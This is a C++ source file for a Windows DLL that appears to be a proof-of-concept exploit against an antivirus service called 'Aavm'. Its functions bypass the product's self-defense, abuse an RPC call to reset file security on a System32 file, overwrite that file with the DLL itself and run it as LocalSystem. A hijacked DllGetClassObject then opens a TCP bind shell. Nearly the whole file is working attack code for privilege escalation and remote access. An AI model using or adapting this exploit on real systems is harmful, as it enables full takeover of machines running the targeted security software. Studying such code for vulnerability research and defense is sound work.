// AavmArbitraryFileSetSecurityExploit.cpp : Defines the exported functions for the DLL.
//

#include <Windows.h>
#include "AavmArbitraryFileSetSecurityExploit.h"
#include "AavmRpcClient.h"
#include "Payload.h"
#include "PayloadExecution.h"
#include "detours.h"
#include "wil/stl.h"
#include "wil/win32_helpers.h"
#include <stdexcept>
#include <filesystem>

namespace fs = std::filesystem;

EntryPointType g_originalEntryPoint;

void CALLBACK Exploit(HWND, HINSTANCE, PCSTR, INT)
{
    try
    {
        BypassSelfDefense();
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
    }
}

int APIENTRY EscalatePrivileges()
{
    try
    {
        AavmRpcClient aavmRpcClient;
        const fs::path targetFilePath = LR"(C:\Windows\System32\license.rtf)";

        aavmRpcClient.ArbitraryFileResetSecurity(targetFilePath.c_str());

        auto thisModuleBaseAddress =
            DetourGetContainingModule(DetourCodeFromPointer(EscalatePrivileges, nullptr));
        if (!thisModuleBaseAddress)
            throw std::runtime_error("DetourGetContainingModule failed");

        const auto thisModulePath =
            fs::path(wil::GetModuleFileNameW<std::wstring>(thisModuleBaseAddress));

        fs::copy_file(thisModulePath, targetFilePath, fs::copy_options::overwrite_existing);

        ExecutePayloadAsLocalSystem(targetFilePath.filename().c_str());
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
    }

    return /*g_originalEntryPoint()*/0;
}

// ExecutePayload()
HRESULT __stdcall DllGetClassObject(REFCLSID, REFIID, LPVOID *)
{
    try
    {
        ShellBindTcp();
    }
    catch (const std::exception &e)
    {
        // ToDo: Log error
        UNREFERENCED_PARAMETER(e);
        __debugbreak();
        return E_FAIL;
    }

    return S_OK;
}
